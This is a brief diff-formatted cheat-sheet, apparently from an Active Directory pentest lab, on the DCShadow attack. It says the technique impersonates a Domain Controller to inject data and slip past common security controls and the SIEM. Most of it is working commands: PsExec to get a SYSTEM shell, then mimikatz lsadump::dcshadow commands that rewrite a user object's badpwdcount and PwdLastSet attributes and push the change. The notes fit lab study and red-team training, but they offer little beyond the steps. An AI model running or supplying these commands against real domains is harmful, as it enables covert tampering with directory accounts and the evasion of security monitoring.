@@ -1,0 +1,14 @@
+It simulates the behavior of a Domain Controller (using protocols like RPC used only by DC) to inject its own data, bypassing most of the common security controls and including your SIEM. It shares some similarities with the DCSync attack (already present in the lsadump module of mimikatz). 
+
+#run as system
+PsExec.exe -i -s cmd 
+
+#push attribute 
+mimikatz.exe
+lsadump::dcshadow /object:student5 /attribute:badpwdcount /value:3333
+lsadump::dcshadow /object:student5 /attribute:PwdLastset /value:0x1D4B32777877508
+
+#open cmd as admin
+#push the attribute change
+mimikatz.exe
+lsadump::dcshadow /push
